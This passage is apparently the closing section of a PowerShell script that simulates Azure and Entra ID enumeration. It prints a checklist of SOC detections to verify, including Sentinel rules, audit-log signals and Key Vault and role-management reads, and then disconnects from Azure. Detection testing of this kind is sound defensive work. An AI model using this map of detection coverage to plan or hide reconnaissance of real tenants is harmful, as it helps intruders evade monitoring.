Write-Host "[*] Check the following for SOC alerts:" -ForegroundColor Cyan
Write-Host "     - Azure Monitor: unusual List/Read operations (especially RoleManagement, Policy, KeyVault)" -ForegroundColor White
Write-Host "     - Entra ID Audit Logs: bulk directory reads from one identity" -ForegroundColor White
Write-Host "     - Defender for Cloud Apps: 'Mass download' / 'Unusual enumeration' policies" -ForegroundColor White
Write-Host "     - Microsoft Sentinel: 'Suspicious enumeration of directory objects'," -ForegroundColor White
Write-Host "                           'PIM roles enumeration'," -ForegroundColor White
Write-Host "                           'Conditional Access policies enumeration'" -ForegroundColor White
Write-Host "     - Graph activity logs (if enabled): /roleManagement, /conditionalAccess, /policies calls" -ForegroundColor White
Write-Host ""

Disconnect-AzAccount | Out-Null
Write-Host "[+] Disconnected from Azure.`n" -ForegroundColor Green
